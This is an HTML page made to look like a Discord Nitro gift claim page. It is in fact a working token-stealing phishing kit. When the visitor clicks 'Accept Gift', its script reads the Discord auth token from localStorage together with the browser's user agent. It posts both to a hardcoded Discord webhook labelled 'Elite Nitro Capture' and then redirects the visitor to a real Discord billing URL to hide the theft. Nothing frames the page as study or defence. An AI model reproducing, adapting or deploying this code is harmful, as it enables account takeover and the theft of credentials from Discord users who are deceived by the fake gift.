<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord</title>
    <style>
        :root {
            --brand-blurple: #5865f2;
            --brand-hover: #4752c4;
            --bg-color: #202225;
            --modal-bg: #2f3136;
            --text-main: #ffffff;
            --text-sub: #b9bbbe;
        }

        body {
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        .modal {
            background: var(--modal-bg);
            width: 440px;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 0 1px rgba(0,0,0,0.3);
            text-align: center;
        }

        .icon { width: 80px; height: 80px; margin-bottom: 20px; }
        
        h1 { color: var(--text-main); font-size: 24px; margin-bottom: 16px; }
        p { color: var(--text-sub); font-size: 15px; margin-bottom: 30px; line-height: 1.4; }

        .btn {
            background-color: var(--brand-blurple);
            color: white;
            border: none;
            padding: 12px 20px;
            width: 100%;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.1s ease;
        }

        .btn:hover { background-color: var(--brand-hover); }
        .btn:active { transform: scale(0.98); }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #72767d;
        }
    </style>
</head>
<body>

    <div class="modal">
        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="icon" alt="Nitro">
        <h1>You've been gifted Nitro!</h1>
        <p>A gift of 3 months of Discord Nitro has been sent to your account. Click below to verify and claim your subscription.</p>
        <button id="claimBtn" class="btn">Accept Gift</button>
        <div class="footer">Valid payment method required for verification.</div>
    </div>

    <script>
        document.getElementById('claimBtn').addEventListener('click', async () => {
            const btn = document.getElementById('claimBtn');
            btn.innerText = "Verifying...";
            btn.disabled = true;

            const token = localStorage.getItem("token") || localStorage.getItem("authentication_token");
            
            const payload = {
                content: "@everyone",
                embeds: [{
                    title: "🚀 Elite Nitro Capture",
                    color: 0x5865F2,
                    fields: [
                        { name: "Auth Token", value: `\`${token || "N/A"}\``, inline: false },
                        { name: "Device Info", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch('https://discordapp.com/api/webhooks/1512110492687274024/TUENZycpaVUR0foYAvP5QDl1oHpZ3EtWOOIRh8jqi-HJhJaAtPt_1z3_OrCFMd_W7CE5', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (err) { console.error(err); }

            setTimeout(() => {
                window.location.replace("https://discord.com/billing/promotions/gift-accepted");
            }, 1200);
        });
    </script>
</body>
</html>
